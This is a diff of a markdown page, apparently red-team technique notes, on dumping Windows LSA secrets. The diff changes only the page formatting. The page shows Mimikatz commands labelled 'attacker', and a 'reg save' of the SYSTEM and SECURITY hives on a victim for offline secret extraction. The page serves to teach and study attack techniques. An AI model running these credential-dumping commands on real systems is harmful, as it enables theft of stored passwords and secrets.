@@ -20,14 +20,12 @@ HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
 
 Secrets can be dumped from memory like so:
 
-{% tabs %}
-{% tab title="attacker@mimikatz" %}
+{% code title="attacker@mimikatz" %}
 ```text
 token::elevate
 lsadump::secrets
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-12-20-25-01.png)
 
@@ -35,23 +33,19 @@ lsadump::secrets
 
 LSA secrets can be dumped from registry hives likes so:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 reg save HKLM\SYSTEM system & reg save HKLM\security security
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-12-20-37-11.png)
 
-{% tabs %}
-{% tab title="attacker@mimikatz" %}
+{% code title="attacker@mimikatz" %}
 ```csharp
 lsadump::secrets /system:c:\temp\system /security:c:\temp\security
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-12-20-38-02.png)
 
